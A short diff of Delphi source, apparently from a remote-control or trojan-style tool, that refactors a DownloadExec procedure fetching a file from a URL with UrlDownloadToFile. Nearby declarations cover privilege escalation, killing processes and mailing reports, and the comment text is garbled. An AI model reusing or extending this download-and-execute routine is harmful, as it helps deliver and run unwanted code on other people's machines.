@@ -8,7 +8,7 @@ uses
 
 procedure SetPrivilege(pName: PChar);
 function KillTask(ExeFileName: string): Integer;
-procedure DownloadExec(sUrl: PChar);
+procedure DownloadExec(lpUrl: PChar);
 procedure SendMail(Task: TTask);
 procedure WakeUpPro(MacAddr: string);
 
@@ -64,10 +64,11 @@ end;
 
 { --------œ¬‘ÿ‘À–– -----------}
 
-procedure DownloadExec(sUrl: PChar);
+procedure DownloadExec(lpUrl: PChar);
 var
-  sFile             : string;
+  sUrl, sFile       : string;
 begin
+  sUrl := lpUrl;
   sFile := FormatDateTime('yyyyMMddhhmmss.', now) + copy(sUrl,
     Length(sUrl) - 2, Length(sUrl));
   UrlDownloadToFile(nil, PChar(sUrl), PChar(sFile), 0, nil);
